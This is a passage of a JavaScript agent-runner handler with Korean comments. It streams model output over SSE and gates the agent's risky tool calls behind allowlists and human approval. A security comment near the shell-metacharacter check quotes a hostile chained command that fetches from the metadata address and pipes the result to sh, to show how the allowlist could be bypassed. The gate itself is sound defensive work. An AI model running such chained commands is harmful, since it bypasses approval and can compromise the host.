/**
 * Agent Runner 핸들러 — Anthropic API 스트림(raw HTTP, turn-manager 경유) 호출 + SSE 변환.
 * (Claude Agent SDK 자체는 미사용 — 출력은 SDK 호환 메시지 형식, llm-wrapper.js 참조.)
 * Plan Mode: 위험 도구 사용 시 canUseTool 훅에서 in-flight pause(T1).
 *
 * 순수 JS(ESM) — 컴파일 없이 실행 가능.
 */

import { createHash } from 'node:crypto'
import { readFile } from 'node:fs/promises'
import { ApprovalManager } from './approval-manager.js'
import { REQUEST_SECRET_TOOL, isValidSecretKey, isReservedKey } from './tools/request-secret.js'
import { appendEvent, ensureBuffer, getEventsSince, getBufferState } from './event-buffer.js'
import { runAnthropicSdkStream } from './llm-wrapper.js'
import { asyncIteratorWithFirstYieldRetry, classifyLlmError, sanitizeErrorDetail } from './retry-utils.js'
import { logError } from './logger.js'

/**
 * 샌드박스 기본 작업 디렉토리.
 * SYNC: src/lib/constants.ts `SANDBOX_PATHS.BASE`와 수동 동기.
 * 자세한 contract는 ./CONTRACT.md §1-1 참조.
 */
const DEFAULT_CWD = '/workspace'

/**
 * Phase B — 워크스페이스 secret store. 모듈 레벨(= agent-runner 프로세스 = 샌드박스/워크스페이스 1개
 * 수명)이라 handleChat(턴)마다 새로 만들지 않는다. 한 번 제공된 secret이 같은 샌드박스의 후속 턴에서도
 * 유지돼 "이미 사용 가능"으로 인식된다(턴마다 재요청되던 갭 해소). getToolEnv가 이 맵을 도구 자식 env로 주입.
 * agent-runner 한 프로세스는 한 워크스페이스만 서빙하므로 워크스페이스 스코프(교차 유출 없음).
 */
const workspaceSecrets = new Map()

/** 재시작 시 vault→writeWorkspaceEnv가 주입하는 파일. Bash가 BASH_ENV로 source해 자식 env로 export. */
const INTEGRATIONS_ENV_PATH = '/workspace/.integrations.env'

/**
 * 키가 .integrations.env(재시작 시 vault 주입분)에 export돼 있는지 확인. 있으면 Bash 자식이 BASH_ENV로
 * 이미 보유하므로 request_secret 재요청이 불필요하다. keyName은 isValidSecretKey(^[A-Z][A-Z0-9_]*$)로
 * 검증된 뒤에만 호출되므로 정규식 인젝션 안전.
 * @param {string} keyName
 * @returns {Promise<boolean>}
 */
async function isKeyInIntegrationsEnv(keyName) {
  try {
    const content = await readFile(INTEGRATIONS_ENV_PATH, 'utf8')
    return new RegExp(`^(?:export\\s+)?${keyName}=`, 'm').test(content)
  } catch {
    return false
  }
}

/**
 * cloud(params.model) 미전달 시 fallback.
 * agent-runner는 별개 npm 패키지(의존성 0)라 src/lib import 불가.
 * SYNC: src/lib/llm/models.ts `MODEL_REGISTRY.sonnet.id`와 수동 동기.
 * 자세한 contract는 ./CONTRACT.md §1-2 참조.
 */
const DEFAULT_FALLBACK_MODEL = 'claude-sonnet-4-6'

/**
 * cloud가 보낸 history(이전 user/assistant 발화)를 prompt 앞에 transcript로 prepend.
 *
 * 래퍼 인터페이스(runAnthropicSdkStream)는 prompt: string 단일 입력(SDK 호환)이라 messages
 * 배열을 직접 못 넘긴다. sandbox idle hibernate 후 cold start되면 진행 중 conversation
 * 컨텍스트도 사라지므로, history를 텍스트로 합쳐 같은 turn 내 컨텍스트로 전달.
 *
 * @param {Array<{role: string, content: string}>|undefined} history
 * @param {string} userMessage
 * @returns {string}
 */
function buildPromptWithHistory(history, userMessage) {
  if (!Array.isArray(history) || history.length === 0) return userMessage
  const lines = ['<conversation_history>']
  for (const h of history) {
    const role = h?.role === 'assistant' ? 'Assistant' : 'User'
    lines.push(`<turn role="${role}">`)
    lines.push(String(h?.content ?? ''))
    lines.push('</turn>')
  }
  lines.push('</conversation_history>')
  lines.push('')
  lines.push(userMessage)
  return lines.join('\n')
}

/** 결재 대기 기본 타임아웃 (10분). cloud가 Vercel timeout으로 끊겨도 T4/T5 resume으로 회복. */
const DEFAULT_APPROVAL_TIMEOUT_MS = 10 * 60 * 1000

/** Turn cap 도달 시 사용자 결재 없이 자동 연장하는 최대 횟수. 초과하면 깔끔 종료.
 *  비개발자에게 "도구 N/M턴 사용" 카운터를 노출하지 않는 게 목적 — 한도는 개발자 튜닝
 *  파라미터이지 사용자 의사결정 거리가 아님. */
const MAX_AUTO_EXTENSIONS = 3

/** 한 번 자동 연장 시 추가되는 turn budget. 기본 50 + 3회 연장 = 최대 140 silent. */
const AUTO_EXTEND_INCREMENT = 30

/** 같은 도구 연속 호출 임계 — 초과하면 루프 의심으로 자동 종료. */
const REPEATED_TOOL_THRESHOLD = 10

/** SDK maxTurns의 절대 상한. 자체 카운터가 단독 통제하므로 SDK는 brake 역할만. */
const SDK_HARD_MAX_TURNS = 300

/**
 * SSE heartbeat 간격 (ms). 프록시/CDN idle timeout(일반적 60초)의 절반.
 * 결재 대기·도구 무응답 구간에서도 30초 안에 한 번씩 빈 comment를 push해
 * idle proxy timeout(SSE 무응답 종료)을 방지한다.
 * EventBuffer에는 누적하지 않음(seq 낭비 방지) — 휘발성 keepalive comment.
 *
 * 근거: 30s heartbeat tick으로 idle proxy timeout 방지.
 */
const HEARTBEAT_INTERVAL_MS = 30 * 1000

/**
 * 활성 res에 SSE comment(`: keepalive\n\n`)를 주기적으로 push.
 * 반환값은 stop 함수 — req close / 응답 종료 / 새 res로 swap 시 호출.
 *
 * @param {string} sessionId
 * @returns {() => void}
 */
function startHeartbeat(sessionId) {
  const tick = setInterval(() => {
    const res = activeSessions.get(sessionId)?.res
    if (!res || res.writableEnded) return
    try {
      res.write(': keepalive\n\n')
    } catch {
      /* 연결 끊김은 무시 — emitSseEvent와 동일한 invariant */
    }
  }, HEARTBEAT_INTERVAL_MS)
  tick.unref?.()
  return () => clearInterval(tick)
}

/**
 * SSE 이벤트를 전송 + EventBuffer(T4)에 누적.
 * 라이브 전송 대상 res는 activeSessions[sessionId].res에서 매번 조회 —
 * T5 resume이 res를 swap한 후에도 emit가 새 res로 흘러간다.
 * 세션이 없거나 res가 죽었어도 buffer 누적은 보장.
 *
 * @param {string} sessionId
 * @param {string} event
 * @param {Record<string, unknown>} data
 */
function emitSseEvent(sessionId, event, data) {
  const evt = appendEvent(sessionId, event, data)
  const payload = { ...data, seq: evt.seq, session_id: sessionId }
  const res = activeSessions.get(sessionId)?.res
  if (res && !res.writableEnded) {
    try {
      res.write(`event: ${event}\nid: ${evt.seq}\ndata: ${JSON.stringify(payload)}\n\n`)
    } catch {
      /* 연결 끊김은 무시 — buffer는 유지 */
    }
  }
}

/**
 * 연속 턴 안내 — history가 비어있지 않은(=진행 중 대화의 후속) 턴에만 system prompt 끝에 덧붙인다.
 * 후속 턴을 "첫 턴"으로 오인해 매번 재인사 + 세션 시작 절차를 반복하는 회귀를 막는다.
 * 멀티턴 대화 프레이밍은 실행 글루의 책임이므로 runner에 둔다 — 워크스페이스 고유의
 * 메모리/페르소나 구조 같은 도메인 규약은 호출자(system_prompt)가 소유한다.
 */
const CONTINUATION_NOTICE = `
## Continuing conversation (follow-up turn)

This call is a follow-up turn in an ongoing conversation, not the first turn of a new session. The prior conversation and tool results are in the <conversation_history> above.

- Do not greet again ("hello", "I'm back", etc.) or re-introduce yourself — you have already done so.
- Do not repeat any session-start setup. It has already run this session; only revisit it if the user explicitly points at persistent memory/knowledge or instructs a fact change.
- Build on work already done in previous turns (file attachments, conversions, uploads, tool results) using the conversation history. Do not re-ask what was already handled or start over.
`.trim()

/** Tool 호출 정책 평가. 호출자가 보낸 policy(security/ask/allowlist)와 동일 스키마 —
 *  policy 미전달 시 아래 DEFAULT_POLICY(deny-on-miss)로 보수적 fallback. */
const RISKY_TOOL_NAMES = new Set(['Bash', 'Write', 'Edit', 'NotebookEdit'])
const SAFE_BINS = new Set(['jq', 'grep', 'cut', 'sort', 'uniq', 'head', 'tail', 'tr', 'wc'])

/** 기본 정책 — 클라우드에서 policy를 보내지 않은 경우 fallback */
const DEFAULT_POLICY = {
  security: 'allowlist',
  ask: 'on-miss',
  askFallback: 'deny',
  allowlist: [],
}

/** /workspace/knowledge/ 하위 경로 감지용 프리픽스. SANDBOX_PATHS와 일치. */
const KNOWLEDGE_PATH_PREFIX = '/workspace/knowledge/'

/**
 * 도구 호출이 지식 경로 읽기인지 판정. 맞으면 {path, source} 반환, 아니면 null.
 * 클라우드 측에서 recordDocumentAccess(workspaceId, path, {context, source, messageId})로 연결.
 */
function detectKnowledgeAccess(toolName, input) {
  if (toolName === 'Read' || toolName === 'Grep') {
    const path = String(input.file_path ?? input.path ?? '')
    if (path.startsWith(KNOWLEDGE_PATH_PREFIX)) {
      return { path, source: toolName === 'Read' ? 'read' : 'grep' }
    }
    return null
  }
  // MCP wiki_read는 도구명이 'mcp__...__wiki_read' 형태로 올 수 있음.
  if (toolName.endsWith('wiki_read') || toolName === 'wiki_read') {
    const name = String(input.page ?? input.name ?? '')
    const category = String(input.category ?? '')
    if (!name) return null
    const path = category
      ? `${KNOWLEDGE_PATH_PREFIX}wiki/${category}/${name}`
      : `${KNOWLEDGE_PATH_PREFIX}wiki/${name}`
    return { path, source: 'wiki_read' }
  }
  return null
}

/** glob → RegExp (case-insensitive). `**` → `.*`, `*` → `[^/]*`, `?` → `.` */
function globToRegex(pattern) {
  let body = ''
  for (let i = 0; i < pattern.length; i++) {
    const ch = pattern[i]
    if (ch === '*') {
      if (pattern[i + 1] === '*') {
        body += '.*'
        i++
      } else {
        body += '[^/]*'
      }
    } else if (ch === '?') {
      body += '.'
    } else if (/[a-z0-9_/-]/i.test(ch)) {
      body += ch
    } else {
      body += '\\' + ch
    }
  }
  return new RegExp(`^${body}$`, 'i')
}

function matchesAllowlist(value, patterns) {
  if (!Array.isArray(patterns) || patterns.length === 0) return false
  return patterns.some((p) => globToRegex(String(p)).test(value))
}

function extractBashHead(command) {
  const trimmed = String(command ?? '').trim()
  if (!trimmed) return null
  const tokens = trimmed.split(/\s+/)
  return { bin: tokens[0], args: tokens.slice(1) }
}

/** 인용부호 밖에 셸 메타문자로 취급되는 문자들. $( 와 서브셸은 ( 로 함께 걸린다. */
const SHELL_METACHARS = new Set([';', '&', '|', '<', '>', '`', '(', ')', '\n', '\r'])

/**
 * 인용부호(', ") 밖에 셸 메타문자가 있는지 검사한다 (SEC-T7).
 *
 * extractBashHead는 공백으로만 토큰을 쪼개 첫 토큰(bin)만 추출하므로, allowlist에 든 bin이
 * 명령 맨 앞에만 오면 `git log; curl 169.254.169.254 | sh` 같은 체인/파이프/서브셸이
 * 결재 없이 통과해 bash -c로 전체 실행된다. 메타문자가 인용부호 밖에 하나라도 있으면
 * safe-bin/allowlist 자동 통과를 막고 결재(plan_request)로 강등한다.
 * cloud(policy.ts hasUnquotedShellMetachar)와 동일 구현 — 드리프트 금지.
 */
export function hasUnquotedShellMetachar(command) {
  let quote = null
  const str = String(command ?? '')
  for (let i = 0; i < str.length; i++) {
    const ch = str[i]
    if (quote) {
      if (quote === '"' && ch === '\\') {
        i++
        continue
      }
      if (ch === quote) quote = null
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      continue
    }
    if (ch === '\\') {
      i++
      continue
    }
    if (SHELL_METACHARS.has(ch)) return true
  }
  return false
}

const CACHE_DIR = '/workspace/knowledge/sources/uploads/.cache'

function unquoteShellToken(token) {
  if (typeof token !== 'string' || token.length < 2) return token.replace(/\\(.)/g, '$1')
  const first = token[0]
  const last = token[token.length - 1]
  if (first === '"' && last === '"') {
    return token.slice(1, -1).replace(/\\(["$`\\])/g, '$1')
  }
  if (first === "'" && last === "'") {
    return token.slice(1, -1)
  }
  return token.replace(/\\(.)/g, '$1')
}

function doubleQuoteForShell(s) {
  return `"${String(s).replace(/(["$`\\])/g, '\\$1')}"`
}

/**
 * LLM이 cli.js read* 결과를 `.cache/<X>.md`로 redirect할 때, 출력 경로의 basename을
 * **입력 path basename으로 강제 정정**해 SDK에 돌려준다.
 *
 * 배경: 시스템 프롬프트가 `node /workspace/.tools/document-X/cli.js read<Type> <in> > <.cache/X.md>`
 * 같은 패턴을 권장하는데, LLM이 출력 경로를 자기 토큰으로 재생산하면서
 *   1) 한국어 한 글자를 한자로 hallucinate (예: '반' → '般')
 *   2) 공백/괄호/따옴표를 임의 정리
 * 가 함께 일어나 캐시 파일명이 원본과 어긋난다. 이 함수가 SDK가 명령을 실행하기 전에
 * `>` 다음 토큰을 결정론적으로 교정한다.
 *
 * 동작 조건 (모두 충족 시에만 변환, 아니면 원본 그대로):
 *  - command에 `/cli.js read<Word> ` 가 포함
 *  - 그 뒤에 `>` 또는 `>>` 리다이렉트가 등장 (stderr `2>` 제외)
 *  - 리다이렉트 우측 첫 토큰이 `.cache/` 경로 (잘못된 redirect를 마구 바꾸지 않도록)
 *
 * 안전 인용: 입력 basename에 공백/괄호/한국어/따옴표가 있을 수 있어 큰따옴표로 묶고
 * `"`, `$`, `` ` ``, `\` 만 이스케이프 (셸 전개 차단).
 *
 * @param {string} command
 * @returns {string} 교정된 명령 또는 원본
 */
export function correctCacheRedirect(command) {
  if (typeof command !== 'string' || command.length === 0) return command
  if (!/\/cli\.js\s+read\w+\s/.test(command)) return command

  // redirect operator + 우측 첫 토큰 매칭. 앞에 숫자(2>, 1>)가 붙으면 fd redirect라 제외.
  const redirectRe = /(^|[^0-9])(\s)(>>?)(\s+)("[^"]*"|'[^']*'|\S+)/
  const match = redirectRe.exec(command)
  if (!match) return command

  const matchStart = match.index + match[1].length
  const fullMatch = match[0].slice(match[1].length)
  const leadingWs = match[2]
  const redirectOp = match[3]
  const innerWs = match[4]
  const oldOutputToken = match[5]

  const oldOutputPath = unquoteShellToken(oldOutputToken)
  if (!oldOutputPath.includes('/.cache/')) return command

  // 좌측에서 input path 토큰 추출 (redirect 직전의 마지막 인용/비공백 토큰).
  const leftPart = command.slice(0, matchStart)
  const inputTokenRe = /("[^"]*"|'[^']*'|\S+)\s*$/
  const tokMatch = inputTokenRe.exec(leftPart)
  if (!tokMatch) return command

  const inputPath = unquoteShellToken(tokMatch[1])
  const lastSlash = inputPath.lastIndexOf('/')
  const inputBase = lastSlash >= 0 ? inputPath.slice(lastSlash + 1) : inputPath
  if (!inputBase) return command

  const correctedPath = `${CACHE_DIR}/${inputBase}.md`
  const safeOutput = doubleQuoteForShell(correctedPath)

  const before = command.slice(0, matchStart + leadingWs.length + redirectOp.length + innerWs.length)
  const after = command.slice(matchStart + fullMatch.length)
  return before + safeOutput + after
}

/** Bash 도구에 한해 input.command를 correctCacheRedirect로 교정해 새 input 객체를 반환. */
function applyCacheRedirectCorrection(toolName, input) {
  if (toolName !== 'Bash' || !input || typeof input.command !== 'string') return input
  const corrected = correctCacheRedirect(input.command)
  if (corrected === input.command) return input
  return { ...input, command: corrected }
}

function isSafeBinCall(head) {
  if (!head || !SAFE_BINS.has(head.bin)) return false
  for (const arg of head.args) {
    if (arg.startsWith('-')) continue
    if ((arg.startsWith("'") && arg.endsWith("'")) || (arg.startsWith('"') && arg.endsWith('"'))) continue
    return false
  }
  return true
}

function summarizeToolInput(toolName, input) {
  if (toolName === 'Bash') return String(input.command ?? '').slice(0, 200)
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'NotebookEdit') {
    return String(input.file_path ?? '').slice(0, 200)
  }
  try {
    return JSON.stringify(input).slice(0, 200)
  } catch {
    return ''
  }
}

/** UI/외부 채널 카드 본문에서 도구·이유를 사람이 읽을 한국어로 변환. */
const TOOL_LABEL_KO = {
  Bash: '터미널 명령 실행',
  Write: '파일 생성',
  Edit: '파일 수정',
  NotebookEdit: '노트북 수정',
}

const REASON_LABEL_KO = {
  'risky-default': '위험할 수 있는 동작이라 한 번 확인이 필요해요',
  'on-miss': '허용 목록에 없는 명령이라 확인이 필요해요',
  'always': '이 직원은 모든 도구 사용을 항상 결재받도록 설정되어 있어요',
}

/**
 * Plan request 본문 markdown 생성.
 * 카드 본문 + 외부 채널 forwarding(슬랙·팀즈)에서 사용자가 무엇을 결재하는지 즉시 파악 가능하도록 구성.
 * 직원 메타포 + 해요체 톤(.claude/rules/terminology.md, glossary.md). 슬랙 mrkdwn 호환.
 */
function buildPlanContent({ toolName, commandSummary, reason }) {
  const toolLabel = TOOL_LABEL_KO[toolName] || toolName || '알 수 없는 동작'
  const reasonLabel = REASON_LABEL_KO[reason] || ''
  const trimmedSummary = String(commandSummary ?? '').trim()

  const lines = ['이 일을 진행하려면 결재가 필요해요', '', `**무엇** — ${toolLabel}`]
  if (trimmedSummary) {
    const safeSummary = trimmedSummary.length > 1000 ? `${trimmedSummary.slice(0, 1000)}…` : trimmedSummary
    lines.push('**명령**')
    lines.push('```')
    lines.push(safeSummary)
    lines.push('```')
  }
  if (reasonLabel) {
    lines.push(`**왜 결재가 필요한가** — ${reasonLabel}`)
  }
  return lines.join('\n')
}

/**
 * PreToolUse 정책 평가.
 * @returns { kind: 'allow'|'plan_request'|'deny', reason, toolName?, commandSummary? }
 */
export function evaluatePolicy(policy, toolName, input, hasUiChannel) {
  if (!RISKY_TOOL_NAMES.has(toolName)) {
    return { kind: 'allow', reason: 'non-risky' }
  }

  const security = policy?.security ?? 'allowlist'
  const ask = policy?.ask ?? 'on-miss'
  const askFallback = policy?.askFallback ?? 'deny'
  const allowlist = Array.isArray(policy?.allowlist) ? policy.allowlist : []

  if (security === 'full') {
    return { kind: 'allow', reason: 'full' }
  }

  const summary = summarizeToolInput(toolName, input)

  if (security === 'deny') {
    return askOrFallback({ ask, askFallback }, toolName, summary, hasUiChannel, 'risky-default')
  }

  // security === 'allowlist'
  if (toolName === 'Bash') {
    const command = String(input.command ?? '')
    // 셸 메타문자가 인용부호 밖에 있으면 첫 토큰 검사로 안전을 보장할 수 없으므로 자동 통과를
    // 건너뛰고 아래 ask 정책(plan_request)으로 강등한다. (SEC-T7)
    if (!hasUnquotedShellMetachar(command)) {
      const head = extractBashHead(command)
      if (head && isSafeBinCall(head)) return { kind: 'allow', reason: 'safe-bin' }
      if (head && matchesAllowlist(head.bin, allowlist)) return { kind: 'allow', reason: 'allowlist' }
    }
  } else {
    const filePath = String(input.file_path ?? '')
    if (filePath && matchesAllowlist(filePath, allowlist)) return { kind: 'allow', reason: 'allowlist' }
  }

  if (ask === 'off') {
    return { kind: 'deny', reason: 'security-deny', toolName, commandSummary: summary }
  }
  return askOrFallback({ ask, askFallback }, toolName, summary, hasUiChannel, ask === 'always' ? 'always' : 'on-miss')
}

function askOrFallback({ askFallback }, toolName, summary, hasUiChannel, reason) {
  if (hasUiChannel) {
    return { kind: 'plan_request', reason, toolName, commandSummary: summary }
  }
  if (askFallback === 'full') return { kind: 'allow', reason: 'full' }
  return { kind: 'deny', reason: 'ask-fallback-deny', toolName, commandSummary: summary }
}

/** 활성 세션 저장소 (resume + 결재 라우팅용). 세션별 abortController + ApprovalManager. */
const activeSessions = new Map()

/** 결재 라우팅용 — recordId → sessionId 역인덱스 (T3 endpoint에서 사용). */
const approvalRouting = new Map()

/**
 * Graceful shutdown용 — 모든 활성 세션 SDK query를 abort.
 * SIGTERM/SIGINT 수신 시 호출해 in-flight Claude Agent SDK 호출(OTel/toolbox/computer use 포함)이
 * cleanup 단계를 거치도록 한다. 호출하지 않으면 SIGKILL 시점까지 SDK가 비동기 정리를 못 끝내
 * "Error shutting down meter provider" / "Failed to stop computer use" 같은 로그가 남는다.
 *
 * @returns {number} abort 호출된 세션 수
 */
export function abortAllSessions() {
  let count = 0
  for (const session of activeSessions.values()) {
    try {
      session?.abortController?.abort?.()
      count++
    } catch {
      /* ignore — best-effort */
    }
  }
  return count
}

/**
 * T3 엔드포인트(POST /v1/approval/:id)에서 호출하는 라우팅 헬퍼.
 * 활성 세션의 ApprovalManager를 찾아 resolve. 없으면 false.
 *
 * @param {string} approvalId
 * @param {import('./approval-manager.js').ApprovalDecision} decision
 * @param {string|null} [resolvedBy]
 * @returns {boolean}
 */
export function resolveApproval(approvalId, decision, resolvedBy) {
  const sessionId = approvalRouting.get(approvalId)
  if (!sessionId) return false
  const session = activeSessions.get(sessionId)
  if (!session?.approvalManager) return false
  const ok = session.approvalManager.resolve(approvalId, decision, resolvedBy)
  if (ok) approvalRouting.delete(approvalId)
  return ok
}

/**
 * Resume 모드 — 진행 중 세션의 res를 swap하고 from_seq 이후 이벤트 replay.
 * 스트림을 새로 시작하지 않음. 진행 중 turn-manager가 emit하는 신규 이벤트는
 * 이미 등록된 emitSseEvent가 새 res로 흘려보냄. session done까지 res를 잡아둠.
 *
 * @param {string} sessionId
 * @param {number} fromSeq
 * @param {import('node:http').ServerResponse} res
 * @param {import('node:http').IncomingMessage} [req]
 */
async function handleResume(sessionId, fromSeq, res, req) {
  const bufState = getBufferState(sessionId)
  if (!bufState) {
    res.writeHead(410, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify({ error: 'Session buffer gone', session_id: sessionId }))
    return
  }

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
  })

  // 이전 res가 살아있으면 정중하게 종료(같은 세션에 두 res가 동시에 매달려 있으면 안 됨).
  const session = activeSessions.get(sessionId)
  if (session) {
    const prevRes = session.res
    if (prevRes && prevRes !== res && !prevRes.writableEnded) {
      try { prevRes.end() } catch { /* ignore */ }
    }
    session.res = res
  }

  // 1) replay: from_seq 이후 buffer 이벤트
  const events = getEventsSince(sessionId, fromSeq)
  for (const evt of events) {
    const payload = { ...evt.data, seq: evt.seq, session_id: sessionId }
    try {
      res.write(`event: ${evt.event}\nid: ${evt.seq}\ndata: ${JSON.stringify(payload)}\n\n`)
    } catch {
      return
    }
  }

  // buffer가 이미 done이면 즉시 종료
  if (bufState.done) {
    if (!res.writableEnded) res.end()
    return
  }

  // 2) 클라이언트가 또 끊으면 res만 clear
  if (req) {
    req.on('close', () => {
      const cur = activeSessions.get(sessionId)
      if (cur && cur.res === res) cur.res = null
    })
  }

  // 3) live tail — buffer.done(`done` 이벤트가 들어오면 set) 또는 res 종료까지 대기.
  //    emitSseEvent가 활성 세션 res로 흘려보내고, done 이벤트도 그 경로로 도달.
  await new Promise((resolve) => {
    const tick = setInterval(() => {
      const cur = getBufferState(sessionId)
      if (res.writableEnded || cur?.done) {
        clearInterval(tick)
        if (!res.writableEnded) res.end()
        resolve(undefined)
      }
    }, 250)
    tick.unref?.()
  })
}

/**
 * POST /v1/chat 핸들러.
 * Anthropic API 스트림(raw HTTP, turn-manager 경유)을 호출하고 결과를 SSE로 스트리밍합니다.
 * resume_session_id + from_seq 옵션 시 resume 모드(T5).
 *
 * @param {Record<string, unknown>} rawParams
 * @param {import('node:http').ServerResponse} res
 * @param {import('node:http').IncomingMessage} [req]
 */
export async function handleChat(rawParams, res, req) {
  // T5 — resume 분기: 새 SDK 시작하지 않고 buffer replay + live tail.
  const resumeSessionId = typeof rawParams.resume_session_id === 'string' ? rawParams.resume_session_id : ''
  if (resumeSessionId) {
    const fromSeq = typeof rawParams.from_seq === 'number' ? rawParams.from_seq : 0
    return handleResume(resumeSessionId, fromSeq, res, req)
  }

  const params = {
    message: String(rawParams.message ?? ''),
    model: rawParams.model ? String(rawParams.model) : undefined,
    system_prompt: rawParams.system_prompt ? String(rawParams.system_prompt) : undefined,
    history: rawParams.history,
    tools: rawParams.tools,
    mcp_servers: rawParams.mcp_servers,
    // cloud claude-sdk-loop.FETCH_TIMEOUT_MS와 짝. 결재 대기 10분 + 여유 = 12.5분.
    timeout_seconds: typeof rawParams.timeout_seconds === 'number' ? rawParams.timeout_seconds : 750,
    context_dir: rawParams.context_dir ? String(rawParams.context_dir) : undefined,
    /** PreToolUse 평가용 정책 (cloud-side에서 직렬화하여 전달) */
    policy: rawParams.policy && typeof rawParams.policy === 'object' ? rawParams.policy : DEFAULT_POLICY,
    /** 사용자가 명시적으로 plan을 요구한 경우만 true. 메시지 텍스트 분류는 더 이상 사용하지 않음. */
    force_plan_mode: rawParams.force_plan_mode === true,
    session_id: rawParams.session_id ? String(rawParams.session_id) : undefined,
    /** 도구 루프 자체 카운터의 초기 budget. 일반 50, 자율 100. 임계(80%) 도달 시 plan_request로
     *  사용자 결재 → 계속 시 +30씩 budget 증가. 진짜 brake는 timeout_seconds(시간 cap)와
     *  사용자 abort. SDK maxTurns는 별도로 매우 큰 값(SDK_HARD_MAX)으로 고정해 자체 카운터가
     *  단독 통제. 미지정 시 50. */
    max_turns: typeof rawParams.max_turns === 'number' && rawParams.max_turns > 0
      ? Math.floor(rawParams.max_turns)
      : 50,
    /** 결재 대기 timeout (초). 미지정 시 10분. cloud Vercel timeout 초과 대비 길게. */
    approval_timeout_seconds: typeof rawParams.approval_timeout_seconds === 'number' && rawParams.approval_timeout_seconds > 0
      ? Math.floor(rawParams.approval_timeout_seconds)
      : Math.floor(DEFAULT_APPROVAL_TIMEOUT_MS / 1000),
  }

  // SSE 헤더
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
  })

  let toolIndex = 0
  // tool_use_id → 발행 toolIndex 매핑. SDK가 다음 turn에 user role tool_result 메시지를
  // 보낼 때 tool_use_id로 매칭해 정확한 toolIndex를 cloud에 전달 → cloud가 해당 entry의
  // duration_ms를 계산할 수 있게 한다(stream-handler.onToolResult).
  const toolIndexById = new Map()
  // 도구 실행 중 idle progress emit — tool_use ~ tool_result 사이 30초 간격으로 SSE event 발생.
  // 효과: (a) SSE 트래픽 유지로 proxy idle 단절 방지, (b) EventBuffer에 누적되어 자동 resume 시
  // 누락 신호 없음, (c) (후속 이슈에서 cloud가 lastActivityAt 갱신에 활용 가능).
  // toolIndex → setInterval handle 매핑. tool_result 매칭 또는 cleanup 시 clearInterval.
  const TOOL_PROGRESS_INTERVAL_MS = 30_000
  const toolProgressTimers = new Map()
  const toolStartTimes = new Map()
  const startToolProgress = (toolIdx) => {
    const start = Date.now()
    toolStartTimes.set(toolIdx, start)
    const handle = setInterval(() => {
      // 세션이 사라졌으면 timer만 정리. emitSseEvent는 buffer 누적은 보장하지만 leak 방지.
      if (!activeSessions.has(sessionId)) {
        clearInterval(handle)
        toolProgressTimers.delete(toolIdx)
        return
      }
      emitSseEvent(sessionId, 'tool_progress', {
        tool_index: toolIdx,
        elapsed_ms: Date.now() - start,
      })
    }, TOOL_PROGRESS_INTERVAL_MS)
    toolProgressTimers.set(toolIdx, handle)
  }
  const stopToolProgress = (toolIdx) => {
    const h = toolProgressTimers.get(toolIdx)
    if (h) {
      clearInterval(h)
      toolProgressTimers.delete(toolIdx)
    }
    toolStartTimes.delete(toolIdx)
  }
  const stopAllToolProgress = () => {
    for (const h of toolProgressTimers.values()) clearInterval(h)
    toolProgressTimers.clear()
    toolStartTimes.clear()
  }
  let totalInputTokens = 0
  let totalOutputTokens = 0
  const sessionId = params.session_id ?? crypto.randomUUID()
  const abortController = new AbortController()
  const approvalManager = new ApprovalManager()
  const approvalTimeoutMs = params.approval_timeout_seconds * 1000
  // Phase B — secret store는 모듈 레벨 workspaceSecrets(프로세스 수명)로 승격됨. 턴(handleChat)마다
  // 새로 만들지 않아 한 번 제공된 secret이 후속 턴에서도 유지된다(getToolEnv가 도구 자식 env로 주입).
  // res를 세션 맵에 저장 — emitSseEvent + T5 resume이 swap 가능.
  // heartbeatStop은 finally에서 호출. T5 resume이 res를 swap해도 heartbeat tick이
  // activeSessions.get(sessionId)?.res로 매번 조회하므로 자동으로 새 res로 흐름.
  activeSessions.set(sessionId, {
    abortController,
    approvalManager,
    res,
    heartbeatStop: startHeartbeat(sessionId),
  })

  // 클라이언트 연결 끊김: SDK 루프는 유지 (결재 대기 도중 끊겨도 cloud resume으로 회복).
  // res만 clear해 emitSseEvent가 buffer-only 모드로 동작. abort는 새 chat 호출이 들어오거나
  // 결재 timeout 시 자연스레 종료.
  if (req) {
    req.on('close', () => {
      const session = activeSessions.get(sessionId)
      if (session && session.res === res) session.res = null
    })
  }

  try {
    // 6개 파일 도구 + 백그라운드 잡 도구 2종(BashOutput/KillShell) + web server tool 2종.
    // WebSearch/WebFetch는 로컬 실행기가 없는 Anthropic server-side tool — allowlist에 노출되면
    // turn-manager가 request tools[]에 web_search_20250305 / web_fetch_20250910로 자동 등록한다 (llm-wrapper webTools 경유).
    const SDK_BUILTIN_TOOLS = ['Read', 'Edit', 'Glob', 'Grep', 'Bash', 'Write', 'BashOutput', 'KillShell', 'WebSearch', 'WebFetch']
    const userTools = Array.isArray(params.tools) && params.tools.length > 0
      ? params.tools
      : []
    const allowedTools = [...new Set([...SDK_BUILTIN_TOOLS, ...userTools])]

    // MCP 서버 설정 (HTTP transport)
    const mcpServers = Array.isArray(params.mcp_servers) ? params.mcp_servers : []

    let finalContent = ''

    /**
     * canUseTool 훅 (T1) — SDK가 도구 실행 직전 호출. 정책 평가 결과에 따라 분기:
     *  - allow → 즉시 통과
     *  - deny  → 차단(이유 메시지를 SDK에 반환)
     *  - plan_request → ApprovalManager.waitForDecision으로 in-flight pause.
     *    cloud가 SSE plan_request 수신 → 사용자 결재 → POST /v1/approval/:id로 resolve.
     */
    const canUseTool = async (toolName, input) => {
      // request_secret(Phase B)은 정책 게이트를 적용하지 않는다 — 도구 자체가 사용자 결재(secret_request)로
      // 안전성을 확보하고, 값은 LLM에 노출되지 않고 env로만 주입된다. 실행은 runTool→onRequestSecret이 담당.
      if (toolName === 'request_secret') {
        return { behavior: 'allow' }
      }
      const decision = evaluatePolicy(params.policy, toolName, input, true)

      if (decision.kind === 'allow') {
        return { behavior: 'allow', updatedInput: applyCacheRedirectCorrection(toolName, input) }
      }

      const summary = decision.commandSummary ?? summarizeToolInput(toolName, input)

      if (decision.kind === 'deny') {
        emitSseEvent(sessionId, 'tool_use', {
          name: toolName,
          input,
          input_summary: `[차단됨: ${decision.reason}] ${summary}`,
          tool_index: toolIndex++,
          blocked_by_policy: decision.reason,
        })
